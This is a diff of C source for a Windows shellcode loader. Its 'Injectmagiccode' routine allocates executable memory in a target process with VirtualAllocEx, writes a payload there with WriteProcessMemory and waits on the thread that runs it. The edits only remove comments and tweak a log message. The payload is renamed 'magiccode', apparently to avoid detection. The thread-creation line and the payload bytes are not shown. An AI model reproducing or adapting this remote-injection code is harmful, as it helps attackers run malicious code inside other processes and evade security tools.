@@ -17,19 +17,20 @@ void Injectmagiccode(const HANDLE hProcess, const unsigned char* magiccode, SIZE
     PVOID lpAllocationStart = NULL;
     DWORD oldProtect = 0;
 
-    // Corrected usage of magiccodeSize instead of sizeof magiccode
+    
     lpAllocationStart = VirtualAllocEx(hProcess, NULL, magiccodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
     if (lpAllocationStart == NULL) {
         printf("[-] VirtualAllocEx failed (%d).\n", GetLastError());
         return;
     }
 
-    // Correctly writing the magiccode using magiccodeSize
+    
     if (!WriteProcessMemory(hProcess, lpAllocationStart, magiccode, magiccodeSize, NULL)) {
         printf("[-] WriteProcessMemory failed (%d).\n", GetLastError());
         return;
     }
-    //print the memeory address of the shellcode in human readable format
+    
+    
     printf("[+] Shellcode is located at: %p\n", lpAllocationStart);
     
     
@@ -38,7 +39,7 @@ void Injectmagiccode(const HANDLE hProcess, const unsigned char* magiccode, SIZE
 
 
     // Wait for the magiccode to execute
-    DWORD waitResult = WaitForSingleObject(hThread, INFINITE); // Use a reasonable timeout as needed
+    DWORD waitResult = WaitForSingleObject(hThread, INFINITE);  
     if (waitResult == WAIT_OBJECT_0) {
         printf("[+] magiccode execution completed\n");
     } else {
@@ -110,7 +111,7 @@ int main(int argc, char *argv[])
 
     SIZE_T magiccodeSize = sizeof(magiccode);
 
-	printf("[+] Classic execution starts, all userland calls\n");
+	printf("[+] Classic execution starts, all userland calls. \n");
     Injectmagiccode(pi.hProcess, magiccode, magiccodeSize);
 
     CloseHandle(pi.hProcess);
